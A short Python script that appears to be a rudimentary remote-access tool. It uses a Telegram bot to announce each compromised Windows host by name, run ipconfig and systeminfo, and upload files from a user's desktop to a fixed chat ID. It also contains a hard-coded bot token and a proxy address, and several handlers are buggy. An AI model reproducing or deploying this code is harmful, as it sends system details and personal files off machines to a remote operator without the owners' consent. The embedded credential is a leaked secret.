import subprocess
import telebot
import emoji




bot = telebot.TeleBot("1764092484:AAFH54usSJHnb36qu0xTIvbamqBVXEggnc0")  # thay doi token di nha
telebot.apihelper.proxy = {'https':'http://10.57.10.34:3128'} # co the khong can proxy 

# ---------------------------------------------------------------------------
def run_cmd(a):
	cmd = subprocess.run([a], stdout=subprocess.PIPE)
	return cmd.stdout.decode()
def send_system():
	system = subprocess.run(["systeminfo"], stdout=subprocess.PIPE)
	print((system.stdout).decode())
	return ((system.stdout).decode())
def get_host_name():
	icon=emoji.emojize('⛔',language='es')
	hostname = subprocess.run(["hostname"], stdout=subprocess.PIPE)
	return hostname.stdout.decode()
def send_notify():
	icon = emoji.emojize('⛔', language='es')
	notify=icon+" Have connected from "+get_host_name()
	bot.send_message(990978363,notify)
def send_notify_send_files():
	icon = emoji.emojize('⛔', language='es')
	notify=icon+" sendingggg, pls wait.. "
	bot.send_message(990978363,notify)
def send_file():
	bot.send_document(990978363, "C:/Users/tuanpa48/Desktop/test.txt")
# ---------------------------------------------------------------------------
@bot.message_handler(commands=['ipconfig'] )
def send_ipconfig():
	bot.send_message(990978363,run_cmd('ipconfig'))


@bot.message_handler(commands=['sys'] )
def send_system_run():
	bot.send_message(990978363,send_system())

@bot.message_handler(commands=['send'] )
def send_file_notify():
	bot.sendphoto(chat_id=990978363,photo=open("C:/Users/tuanpa48/Desktop/0.jpeg",'rb'))

# C:/Users/tuanpa48/Desktop/test.txt



@bot.message_handler(func=lambda message: True)
def echo_all(message):
	bot.reply_to(message, message.text)


# ---------------------------------------------------------------------------
if __name__ == '__main__':
	send_notify()
	bot.polling()
